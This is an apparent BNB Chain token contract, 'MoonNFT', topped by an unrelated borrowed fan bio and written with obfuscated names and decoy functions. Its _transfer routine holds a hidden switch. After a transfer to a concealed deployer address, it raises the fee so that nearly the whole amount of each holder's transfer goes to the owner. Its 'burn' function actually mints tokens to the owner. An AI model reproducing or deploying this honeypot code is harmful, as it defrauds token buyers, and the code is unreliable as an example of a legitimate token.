/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
 MoonNFT
🌸 Bloom!🐴🦄
@BloomMoonNFT
hiya, i’m bloom! 🌷 | i post about ponies… a lot | toy/mh collector | applejack fanatic | reigen enthusiast | csm brainrot | art:@BloomHorse
🌸https://www.redbubble.com
🌸https://www.facebook.com/Redbubble
🌸https://twitter.com/BloomMoonbeam 

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.17;
contract MoonNFT {
uint256 private  VARTFx = 2;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  vhFACR = 8;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  ivMyjr = 1000000000000000000;
address private  ocgbjp = address(0);
address private  qWJFBq = address(0);
uint256 private  JXxwEh = 7;
uint256 private  NiQCWH = 2;
uint8 public constant decimals = 18;
address public owner;
string public  symbol = "MoonNFT";
uint256 private  VvfEFz = 8;
address private  GWTtqI = address(0);
address private  zZnHgu = address(0);
string public  name = "MoonNFT";
address private  glTEQE = address(0);
mapping (address => uint256) public balanceOf;
address private  JHcLiO = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  frHoQd = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  lBSBOf = 3;
uint256 public constant VDVfAq = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  VptgFS = address(0);
address private  TskNPb = address(0);
//
//
constructor () public {
TskNPb = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getvhFACR() private returns (uint256) {
return vhFACR + 0;
}
//
//
//
//
//
//
//
//
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getNiQCWH() private returns (uint256) {
return NiQCWH + 5;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getVvfEFz() private returns (uint256) {
return VvfEFz + 0;
}
//
//
//
//
//
function _getocgbjp() private returns (address) {
return ocgbjp;
}
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getJHcLiO() private returns (address) {
return JHcLiO;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGWTtqI() private returns (address) {
return GWTtqI;
}
//
function _getJXxwEh() private returns (uint256) {
return JXxwEh + 0;
}
//
//
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ftSbGC");
require(to != address(0), "ftSbGC");
require(amount <= balanceOf[from], "ftSbGC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VDVfAq/ivMyjr ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TskNPb){
ivMyjr = VDVfAq+2;
}
emit Transfer(from, to, transferAmount);
}
function _getfrHoQd() private returns (address) {
return frHoQd;
}
//
function _getVARTFx() private returns (uint256) {
return VARTFx + 6;
}
//
function _getlBSBOf() private returns (uint256) {
return lBSBOf + 6;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tftSbGC 0");
require(spender != address(0), "fftSbGC 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
//
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
//
//
//
function _getqWJFBq() private returns (address) {
return qWJFBq;
}
//
function _getVptgFS() private returns (address) {
return VptgFS;
}
//
//
//
//
//
//
//
function _getglTEQE() private returns (address) {
return glTEQE;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
//
//
function _getzZnHgu() private returns (address) {
return zZnHgu;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}